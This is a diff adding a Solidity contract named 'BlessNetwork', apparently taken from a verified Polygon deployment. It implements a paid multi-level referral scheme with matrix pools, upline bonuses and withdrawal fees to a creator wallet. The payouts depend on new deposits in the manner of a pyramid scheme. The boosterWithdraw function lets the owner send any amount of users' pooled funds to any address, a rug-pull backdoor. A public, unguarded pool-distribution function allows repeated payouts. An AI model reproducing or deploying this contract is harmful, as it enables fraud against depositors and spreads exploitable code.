@@ -1,0 +1,646 @@
+/**
+ *Submitted for verification at polygonscan.com on 2023-03-07
+*/
+
+//SPDX-License-Identifier: None
+pragma solidity ^0.6.0;
+
+contract BlessNetwork {
+    struct User {
+        uint id;
+        uint8 rank;        
+        address referrer;
+        uint partnersCount;
+        uint teamCount;
+        uint256 directincome;
+        uint256 sponsorincome;
+        uint256 levelincome;
+        uint256 autopoolincome;
+        uint256 clubincome;        
+        uint256 teamincome;
+        uint256 uplineincome;
+        uint256 totalincome;
+        uint256 totalwithdraw;  
+		mapping(uint8 => bool) activeLevels;
+        mapping(uint8 => AutoPool) autopoolMatrix; 
+        mapping(uint8 => Level) levelMatrix;  
+    }
+    struct HoldInfo{
+        uint256 directincome;
+        uint256 sponsorincome;
+        uint256 autopoolincome;
+        uint teamCount;
+        uint8 level;
+        mapping(uint8 => uint) directhold; 
+        mapping(uint8 => uint) sponsorhold;
+        mapping(uint8 => uint) autopoolhold; 
+    }
+    mapping(address=>HoldInfo) public holdInfo;
+    
+    struct AutoPool {
+        address currentReferrer;
+        mapping(uint256=>address[]) referrals;
+    }
+    struct Level {
+        address currentReferrer;
+        address[] referrals;
+    }
+    uint8 public constant LAST_LEVEL = 20;
+    mapping(address => User) public users;
+    mapping(uint => address) public idToAddress;
+    uint public lastUserId = 2;
+    uint256 public clubPool;
+    
+
+    mapping(uint256 => mapping(address => uint256)) public userLayerDayDirect5; 
+    mapping(uint256=>address[]) public dayDirect5Users;  
+    
+    uint256 public lastDistribute;
+    uint256 public startTime;
+    uint256 private constant timeStepWeekly =15*60*60;
+
+    mapping(uint8 => mapping(uint256 => address)) public x3vId_number;
+    mapping(uint8 => uint256) public x3CurrentvId;
+    mapping(uint8 => uint256) public x3Index;
+
+    mapping(uint8 => mapping(uint256 => address)) public x2vId_number;
+    mapping(uint8 => uint256) public x2CurrentvId;
+    mapping(uint8 => uint256) public x2Index;
+    
+    
+    address public createrWallet=0xd34375A5F3de7D6fA2AFDc20eF6ab8cF72088597;
+    address public id1=0x5582d905EBAcb327287eD603b4C70F41eaB50Bf0;
+    address[4] public id2=[0x8D00BE4d073bD852dd41e7755ecDFD562Ea6CE80];
+    mapping(uint8 => uint) public directprice;
+    mapping(uint8 => uint) public sponsorprice; 
+    mapping(uint8 => uint) public levelPercents;
+    mapping(uint8 => uint) public autopoolPrice; 
+    mapping(uint8 => uint) public clubfund; 
+    mapping(uint8 => uint) public packagePrice;  
+    mapping(uint8 => uint) public teamIncome;
+    mapping(uint8 => uint) public teamCount;
+    mapping(uint8 => uint) public directCond;
+    mapping(uint8 => uint) public teamdirectCond;
+    address private creation;
+    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
+    event Upgrade(address indexed user, uint8 level);
+    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 matrix, uint8 level);    
+    event NewUserPlace(address indexed user, address indexed referrer, uint8 matrix, uint8 level, uint8 place);
+    event Transaction(address indexed user,address indexed from,uint256 value, uint8 level,uint8 Type);
+    event booster(address indexed user,uint256 value);
+    event withdraw(address indexed user,uint256 value);
+    constructor() public {
+        
+        directprice[1] = 75e15;
+        directprice[2] = 75e15;
+        directprice[3] = 15e16;
+        directprice[4] = 30e16;
+        directprice[5] = 60e16;
+        directprice[6] = 120e16;
+
+        sponsorprice[1] = 25e15;
+        sponsorprice[2] = 5e16;
+        sponsorprice[3] = 10e16;
+        sponsorprice[4] = 20e16;
+        sponsorprice[5] = 40e16;
+        sponsorprice[6] = 80e16;
+
+        levelPercents[1] = 25e14;
+        levelPercents[2] = 5e15;
+        levelPercents[3] = 1e16;
+        levelPercents[4] = 2e16;
+        levelPercents[5] = 4e16;
+        levelPercents[6] = 8e16;
+
+        autopoolPrice[1] = 75e14;
+        autopoolPrice[2] = 225e14;
+        autopoolPrice[3] = 45e15;
+        autopoolPrice[4] = 9e16;
+        autopoolPrice[5] = 18e16;
+        autopoolPrice[6] = 36e16;
+
+        clubfund[1] = 125e14;
+        clubfund[2] = 25e15;
+        clubfund[3] = 5e16;
+        clubfund[4] = 10e16;
+        clubfund[5] = 20e16;
+        clubfund[6] = 40e16;
+
+        packagePrice[1] = 25e16;
+        packagePrice[2] = 50e16;
+        packagePrice[3] = 100e16;
+        packagePrice[4] = 200e16;
+        packagePrice[5] = 400e16;
+        packagePrice[6] = 800e16;
+        
+        teamIncome[1]=50e16;
+        teamIncome[2]=100e16;
+        teamIncome[3]=500e16;
+        teamIncome[4]=1500e16;
+        teamIncome[5]=5000e16;
+        teamIncome[6]=15000e16;
+
+        teamCount[1]=50;
+        teamCount[2]=150;
+        teamCount[3]=650;
+        teamCount[4]=2150;
+        teamCount[5]=7150;
+        teamCount[6]=22150;
+
+        directCond[1]=2;
+        directCond[2]=4;
+        directCond[3]=6;
+        directCond[4]=8;
+        directCond[5]=10;
+        directCond[6]=12;
+
+        teamdirectCond[1]=5;
+        teamdirectCond[2]=10;
+        teamdirectCond[3]=15;
+        teamdirectCond[4]=20;
+        teamdirectCond[5]=25;
+        teamdirectCond[6]=30;
+
+        creation=msg.sender;
+        lastDistribute = block.timestamp;
+        startTime = block.timestamp;
+        User memory user = User({
+            id: 1,
+            rank:0,
+            referrer: address(0),
+            partnersCount: uint(0),
+            teamCount:0,
+            directincome:0,
+            sponsorincome:0,
+            levelincome:0,            
+            autopoolincome:0,
+            clubincome:0,
+            teamincome:0,
+            uplineincome:0,
+            totalincome:0,
+            totalwithdraw:0
+        });
+        users[id1] = user;
+        idToAddress[1] = id1;
+        holdInfo[id1].level = 6;
+        for (uint8 i = 1; i <=6; i++) {
+            x2vId_number[i][1]=id1;
+            x2Index[i]=1;
+            x2CurrentvId[i]=1;  
+            users[id1].activeLevels[i] = true;
+
+            x3vId_number[i][1]=id1;
+            x3Index[i]=1;
+            x3CurrentvId[i]=1;  
+        }
+    }
+    function init() external{
+        require(msg.sender==creation,"Only contract owner"); 
+        for (uint8 i = 0; i < 1; i++) {
+            registration(id2[i], id1);
+            _buyNewLevel(id2[i], 2);
+            _buyNewLevel(id2[i], 3);
+            _buyNewLevel(id2[i], 4);
+            _buyNewLevel(id2[i], 5);
+            _buyNewLevel(id2[i], 6);
+        }
+    }
+    function Invest(address referrerAddress) external payable {
+        require(msg.value == packagePrice[1], "invalid price");
+        registration(msg.sender, referrerAddress);
+    }
+    function InvestAnother(address userAddress,address referrerAddress) external payable{
+        require(msg.value == packagePrice[1], "invalid price");
+        registration(userAddress, referrerAddress);
+    }
+    function BuyBooster() external payable{
+        require(isUserExists(msg.sender), "user is not exists. Register first.");        
+        require(msg.value>=10e16, "Amount should be 10 usdt!");
+        emit booster(msg.sender,msg.value);
+    }
+    
+    function BuyNewPackage(uint8 level) external payable{
+        require(msg.value == packagePrice[level], "invalid price");
+        require(isUserExists(msg.sender), "user is not exists. Register first.");
+        require(level > 1 && level <= 6, "invalid level");
+        require(!users[msg.sender].activeLevels[level], "level already activated");
+        require(users[msg.sender].activeLevels[level-1], "buy previous level first");
+        _buyNewLevel(msg.sender, level); 
+    }
+    function BuyNewPackageAnother(address userAddress,uint8 level) external payable{
+        require(msg.value == packagePrice[level], "invalid price");
+        require(isUserExists(userAddress), "user is not exists. Register first.");
+        require(level > 1 && level <= 6, "invalid level");
+        require(!users[userAddress].activeLevels[level], "level already activated");
+        require(users[userAddress].activeLevels[level-1], "buy previous level first");
+        _buyNewLevel(userAddress, level); 
+        
+    }
+    function registration(address userAddress, address referrerAddress) private {
+        require(!isUserExists(userAddress), "user exists");
+        require(isUserExists(referrerAddress), "referrer not exists");
+
+        User memory user = User({
+            id: lastUserId,
+            rank:0,
+            referrer: referrerAddress,
+            partnersCount: uint(0),
+            teamCount:0,
+            directincome:0,
+            sponsorincome:0,
+            levelincome:0,            
+            autopoolincome:0,
+            clubincome:0,
+            teamincome:0,
+            uplineincome:0,
+            totalincome:0,
+            totalwithdraw:0
+        });
+        
+        users[userAddress] = user;
+        idToAddress[lastUserId] = userAddress;
+        users[userAddress].referrer = referrerAddress;
+        users[userAddress].activeLevels[1] = true;
+         holdInfo[userAddress].level = 1;
+        lastUserId++;
+        users[referrerAddress].partnersCount++;
+        releaseHoldAutoPooolAmount(referrerAddress,1);
+        uint256 dayNow = getCurDay();
+        _updateDirect5User(users[userAddress].referrer, dayNow);
+        clubPool += clubfund[1];
+        _distributelevelIncome(userAddress, directprice[1],1);
+        address upline = users[userAddress].referrer;
+        for(uint8 i = 1; i <= LAST_LEVEL; i++){
+            if(upline != address(0)){
+                users[upline].teamCount++;
+                manageReward(upline);
+                upline = users[upline].referrer;
+            }else{
+                break;
+            }
+        }
+        address freeAutoPoolReferrer = findFreeAutoPoolReferrer(1);
+        users[userAddress].autopoolMatrix[1].currentReferrer = freeAutoPoolReferrer;
+        updateAutoPoolReferrer(userAddress, freeAutoPoolReferrer, 1);
+
+        address freeLevelReferrer = findFreeLevelReferrer(1);
+        users[userAddress].levelMatrix[1].currentReferrer = freeLevelReferrer;
+        updateLevelReferrer(userAddress, freeLevelReferrer, 1);
+
+        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
+    }
+    function _buyNewLevel(address userAddress, uint8 level) private {
+        users[userAddress].activeLevels[level] = true;
+        holdInfo[userAddress].level = level;
+        clubPool += clubfund[level];
+        releaseHoldAmount(userAddress,level);
+        _distributelevelIncome(userAddress, directprice[level],level);
+        
+        address freeAutoPoolReferrer = findFreeAutoPoolReferrer(level);
+        users[userAddress].autopoolMatrix[level].currentReferrer = freeAutoPoolReferrer;
+        updateAutoPoolReferrer(userAddress, freeAutoPoolReferrer,level);
+
+        address freeLevelReferrer = findFreeLevelReferrer(level);
+        users[userAddress].levelMatrix[level].currentReferrer = freeLevelReferrer;
+        updateLevelReferrer(userAddress, freeLevelReferrer, level);
+
+        emit Upgrade(userAddress,level);
+    }
+    function releaseHoldAmount(address userAddress, uint8 level) private {
+        for (uint8 i = level; i >=2; i--) {
+            uint256 _releasedirectamount=holdInfo[userAddress].directhold[level];
+            if(_releasedirectamount>0){
+                users[userAddress].directincome += _releasedirectamount;
+                users[userAddress].totalincome += _releasedirectamount;
+                holdInfo[userAddress].directhold[level]=0;
+            }
+            uint256 _releasesponsoramount=holdInfo[userAddress].sponsorhold[level];
+            if(_releasesponsoramount>0){
+                users[userAddress].sponsorincome += _releasesponsoramount;
+                users[userAddress].totalincome += _releasesponsoramount;
+                holdInfo[userAddress].sponsorhold[level]=0;
+            }
+            uint256 _releaseautopoolamount=holdInfo[userAddress].autopoolhold[level-1];
+            if(_releaseautopoolamount>0 && users[userAddress].partnersCount>=directCond[level-1] && users[userAddress].activeLevels[level]){
+                users[userAddress].autopoolincome += _releaseautopoolamount;
+                users[userAddress].totalincome += _releaseautopoolamount;
+                holdInfo[userAddress].autopoolhold[level-1]=0;
+            }
+            if(level==6){
+                uint256 _releaseautopoolamount6=holdInfo[userAddress].autopoolhold[level];
+                if(_releaseautopoolamount6>0 && users[userAddress].partnersCount>=directCond[level]){
+                    users[userAddress].autopoolincome += _releaseautopoolamount6;
+                    users[userAddress].totalincome += _releaseautopoolamount6;
+                    holdInfo[userAddress].autopoolhold[level]=0;
+                }
+            }
+        }
+    }
+    function releaseHoldAutoPooolAmount(address userAddress, uint8 level) private {
+        uint256 _releaseautopoolamount=holdInfo[userAddress].autopoolhold[level];
+        if(_releaseautopoolamount>0 && users[userAddress].partnersCount>=directCond[level] && users[userAddress].activeLevels[level+1]){
+            users[userAddress].autopoolincome += _releaseautopoolamount;
+            users[userAddress].totalincome += _releaseautopoolamount;
+            holdInfo[userAddress].autopoolhold[level]=0;
+        }
+    }
+    function _distributelevelIncome(address _user, uint256 _amount,uint8 level) private {
+        address _referrer = users[_user].referrer;    
+        holdInfo[_referrer].directincome += _amount;
+        emit Transaction(_referrer,_user,_amount,level,1);
+        if(users[_referrer].activeLevels[level])
+        {
+            users[_referrer].directincome += _amount;
+            users[_referrer].totalincome += _amount;
+        }
+        else {
+            holdInfo[_referrer].directhold[level] += _amount;
+        }
+        address _sponsor = users[_referrer].referrer; 
+        uint256 reward=sponsorprice[level];
+        holdInfo[_sponsor].sponsorincome += reward;
+        emit Transaction(_sponsor,_user,reward,level,7);
+        if(users[_sponsor].activeLevels[level])
+        {
+            users[_sponsor].sponsorincome += reward;
+            users[_sponsor].totalincome += reward;
+        }
+        else {
+            holdInfo[_sponsor].sponsorhold[level] += reward;
+        }
+    }
+    function manageReward(address _user) private {
+        uint8 rank=users[_user].rank;
+        uint8 nextrank=rank+1;
+        if(users[_user].teamCount>=teamCount[nextrank] && users[_user].partnersCount>=teamdirectCond[nextrank] && nextrank<=6)
+        {
+            users[_user].rank=nextrank;
+            users[_user].teamincome+=teamIncome[nextrank];
+            users[_user].totalincome+=teamIncome[nextrank];
+            emit Transaction(_user,id1,teamIncome[nextrank],1,5);  
+        }
+        if(rank==6)
+        {
+            users[_user].teamCount=1;
+            users[_user].rank=0;
+            holdInfo[_user].teamCount+=teamCount[6];
+        }
+    }
+    function distributePoolRewards() public {
+        if(block.timestamp > lastDistribute+timeStepWeekly){  
+            uint256 dayNow = getCurDay();
+           _distribute17DirectPool(dayNow);
+           clubPool=0;
+           lastDistribute = lastDistribute+timeStepWeekly;
+        }
+    }    
+    function getDirect5Length(uint256 _dayNow) external view returns(uint) {
+        return dayDirect5Users[_dayNow].length;
+    }    
+    function _distribute17DirectPool(uint256 _dayNow) public {
+        uint256 direct5Bonus=clubPool*40/100;
+        uint256 direct10Bonus=clubPool*30/100;
+        uint256 direct15Bonus=clubPool*20/100;
+        uint256 direct25Bonus=clubPool*10/100;
+        uint256 direct5Count=0;
+        uint256 direct10Count=0;
+        uint256 direct15Count=0;
+        uint256 direct25Count=0;
+        for(uint256 i = 0; i < dayDirect5Users[_dayNow - 1].length; i++){
+            address userAddr = dayDirect5Users[_dayNow - 1][i];
+            if(userLayerDayDirect5[_dayNow-1][userAddr]>= 5){
+                direct5Count +=1;
+            }
+            if(userLayerDayDirect5[_dayNow-1][userAddr]>= 10){
+                direct10Count +=1;
+            }
+            if(userLayerDayDirect5[_dayNow-1][userAddr]>= 15){
+                direct15Count +=1;
+            }
+            if(userLayerDayDirect5[_dayNow-1][userAddr]>= 25){
+                direct25Count +=1;
+            }
+        }
+        if(direct5Count > 0){
+            uint256 reward = direct5Bonus/direct5Count;
+            for(uint256 i = 0; i < dayDirect5Users[_dayNow - 1].length; i++){
+                address userAddr = dayDirect5Users[_dayNow - 1][i];
+                if(userLayerDayDirect5[_dayNow-1][userAddr]>=5 && userAddr != address(0)){
+                    users[userAddr].clubincome += reward;
+                    users[userAddr].totalincome += reward;
+                    emit Transaction(id1,userAddr,reward,1,4);
+                }
+            }        
+            direct5Bonus = 0;
+        }
+        else {
+            users[id1].clubincome += direct5Bonus;
+            users[id1].totalincome += direct5Bonus;
+        }
+        if(direct10Count > 0){
+            uint256 reward = direct10Bonus/direct10Count;
+            for(uint256 i = 0; i < dayDirect5Users[_dayNow - 1].length; i++){
+                address userAddr = dayDirect5Users[_dayNow - 1][i];
+                if(userLayerDayDirect5[_dayNow-1][userAddr]>=10 && userAddr != address(0)){
+                    users[userAddr].clubincome += reward;
+                    users[userAddr].totalincome += reward;
+                    emit Transaction(id1,userAddr,reward,2,4);
+                }
+            }        
+            direct10Bonus = 0;
+        }
+        else {
+            users[id1].clubincome += direct10Bonus;
+            users[id1].totalincome += direct10Bonus;
+        }
+        if(direct15Count > 0){
+            uint256 reward = direct15Bonus/direct15Count;
+            for(uint256 i = 0; i < dayDirect5Users[_dayNow - 1].length; i++){
+                address userAddr = dayDirect5Users[_dayNow - 1][i];
+                if(userLayerDayDirect5[_dayNow-1][userAddr]>=15 && userAddr != address(0)){
+                    users[userAddr].clubincome += reward;
+                    users[userAddr].totalincome += reward;
+                    emit Transaction(id1,userAddr,reward,3,4);
+                }
+            }        
+            direct15Bonus = 0;
+        }
+        else {
+            users[id1].clubincome += direct15Bonus;
+            users[id1].totalincome += direct15Bonus;
+        }
+        if(direct25Count > 0){
+            uint256 reward = direct25Bonus/direct25Count;
+            for(uint256 i = 0; i < dayDirect5Users[_dayNow - 1].length; i++){
+                address userAddr = dayDirect5Users[_dayNow - 1][i];
+                if(userLayerDayDirect5[_dayNow-1][userAddr]>=25 && userAddr != address(0)){
+                    users[userAddr].clubincome += reward;
+                    users[userAddr].totalincome += reward;
+                    emit Transaction(id1,userAddr,reward,4,4);
+                }
+            }        
+            direct25Bonus = 0;
+        }
+        else {
+            users[id1].clubincome += direct25Bonus;
+            users[id1].totalincome += direct25Bonus;
+        }
+    }
+	function usersActiveLevels(address userAddress, uint8 level) public view returns(bool) {
+        return users[userAddress].activeLevels[level];
+    }
+    function usersDirectHold(address userAddress, uint8 level) public view returns(uint256) {
+        return holdInfo[userAddress].directhold[level];
+    }
+    function usersSponsorHold(address userAddress, uint8 level) public view returns(uint256) {
+        return holdInfo[userAddress].sponsorhold[level];
+    }
+    function usersAutoPoolHold(address userAddress, uint8 level) public view returns(uint256) {
+        return holdInfo[userAddress].autopoolhold[level];
+    }
+    function findFreeLevelReferrer(uint8 level) public view returns(address){
+            uint256 id=x3CurrentvId[level];
+            return x3vId_number[level][id];
+    } 
+    function findFreeAutoPoolReferrer(uint8 level) public view returns(address){
+            uint256 id=x2CurrentvId[level];
+            return x2vId_number[level][id];
+    } 
+    function getWithdrawable(address userAddress) public view returns(uint256){  
+        return (users[userAddress].totalincome - users[userAddress].totalwithdraw);
+    }
+    function usersAutoPool(address userAddress, uint8 level,uint8 step) public view returns(address, address[] memory) {
+        return (users[userAddress].autopoolMatrix[level].currentReferrer,
+                users[userAddress].autopoolMatrix[level].referrals[step]);
+    }
+    function usersLevelPool(address userAddress, uint8 level) public view returns(address, address[] memory) {
+        return (users[userAddress].levelMatrix[level].currentReferrer,
+                users[userAddress].levelMatrix[level].referrals);
+    }
+    function isUserExists(address user) public view returns (bool) {
+        return (users[user].id != 0);
+    }
+    function updateAutoPoolReferrer(address userAddress, address referrerAddress, uint8 level) private{
+        uint256 newIndex=x2Index[level]+1;
+        x2vId_number[level][newIndex]=userAddress;
+        x2Index[level]=newIndex;
+        address upline = referrerAddress;
+        uint place=0;
+        for(uint i=1; i <= 10; i++){
+            users[upline].autopoolMatrix[level].referrals[i].push(userAddress); 
+            if (users[upline].autopoolMatrix[level].referrals[1].length == 2 && i==1) {
+                x2CurrentvId[level]=x2CurrentvId[level]+1;
+            }  
+            uint leveluser = 2**i;
+            if (users[upline].autopoolMatrix[level].referrals[i].length == leveluser) {
+                uint256 autopoolincome=autopoolPrice[level]*leveluser;
+                holdInfo[upline].autopoolincome += autopoolincome;
+                if((users[upline].activeLevels[level+1] && users[upline].partnersCount>=directCond[level]) || (users[upline].activeLevels[6] && users[upline].partnersCount>=directCond[6]))
+                {
+                    users[upline].autopoolincome +=autopoolincome;                     
+                    users[upline].totalincome +=autopoolincome;
+                }
+                else 
+                {
+                    holdInfo[upline].autopoolhold[level] += autopoolincome;
+                }
+                emit Transaction(upline,userAddress,autopoolincome,1,3);
+            } 
+            place +=i==1?0:2**(i-1);
+            emit NewUserPlace(userAddress, upline,1, level,uint8(place)+ uint8(users[upline].autopoolMatrix[level].referrals[i].length));
+            if(upline!=id1){
+                upline = users[upline].autopoolMatrix[level].currentReferrer;
+            }
+            else {
+                break;
+            }  
+        }      
+    }   
+    function updateLevelReferrer(address userAddress, address referrerAddress, uint8 level) private{
+        uint256 newIndex=x3Index[level]+1;
+        x3vId_number[level][newIndex]=userAddress;
+        x3Index[level]=newIndex;
+        
+        users[referrerAddress].levelMatrix[level].referrals.push(userAddress); 
+        if (users[referrerAddress].levelMatrix[level].referrals.length == 3) {
+            x3CurrentvId[level]=x3CurrentvId[level]+1;
+        } 
+        address upline = referrerAddress;
+        uint8 i = 1;
+        for(i=1; i <= LAST_LEVEL; i++){            
+            if(upline != address(0)){
+                uint256 reward=levelPercents[level]; 
+                users[upline].levelincome += reward;                       
+                users[upline].totalincome +=reward;
+                emit Transaction(upline,userAddress,reward,level,2);
+                upline = users[upline].levelMatrix[level].currentReferrer;
+            }
+            else {
+                break;
+            }
+        }      
+        uint256 totalrestreward=0;
+        for(; i <= LAST_LEVEL; i++){  
+            uint256 reward=levelPercents[level];         
+            totalrestreward+=reward;          
+        }
+        if(totalrestreward>0){
+            users[id1].levelincome += totalrestreward;                       
+            users[id1].totalincome +=totalrestreward;
+            emit Transaction(id1,userAddress,totalrestreward,level,18);
+        }
+    }   
+    function boosterWithdraw(address _user,uint256 _amount) external
+    {
+        require(msg.sender==creation,"Only owner");
+        payable(_user).transfer(_amount); 
+        emit withdraw(_user,_amount);
+    }
+    function _updateDirect5User(address _user, uint256 _dayNow) private {
+        userLayerDayDirect5[_dayNow][_user] += 1;
+        bool updated;
+        for(uint256 i = 0; i < dayDirect5Users[_dayNow].length; i++){
+            address direct3User = dayDirect5Users[_dayNow][i];
+            if(direct3User == _user){
+                updated = true;
+                break;
+            }
+        }
+        if(!updated && userLayerDayDirect5[_dayNow][_user]>=5){
+            dayDirect5Users[_dayNow].push(_user);
+        }
+    } 
+    function distributeUplineIncome(address _user,uint8 _level,uint256 _uplinereward) private {
+        uint _totalchild=users[_user].levelMatrix[_level].referrals.length;
+        uint256 reward = _uplinereward/3;
+        if(_totalchild > 0){            
+            for(uint256 i = 0; i < _totalchild; i++){
+                address userAddr = users[_user].levelMatrix[_level].referrals[i];
+                if(userAddr != address(0)){
+                    users[userAddr].uplineincome += reward;
+                    users[userAddr].totalincome += reward;
+                    emit Transaction(id1,userAddr,reward,_level,8);
+                }
+            } 
+        }
+        uint256 extrareward=_uplinereward - (reward*_totalchild);
+        if(extrareward>0) {
+            users[id1].uplineincome += extrareward;
+            users[id1].totalincome += extrareward;
+        }
+    }
+    function getCurDay() public view returns(uint256) {
+        return (block.timestamp-startTime)/timeStepWeekly;
+    } 
+    function IncomeWithdraw(uint256 _amount) public
+    {
+        uint256 balanceReward = getWithdrawable(msg.sender);
+        require(balanceReward>=_amount, "Insufficient reward to withdraw!");
+        users[msg.sender].totalwithdraw+=_amount;
+        distributeUplineIncome(msg.sender,holdInfo[msg.sender].level,_amount*6/100);
+        payable(msg.sender).transfer(_amount*89/100); 
+        payable(createrWallet).transfer(_amount*5/100); 
+        emit withdraw(msg.sender,_amount);
+    }
+    
+}
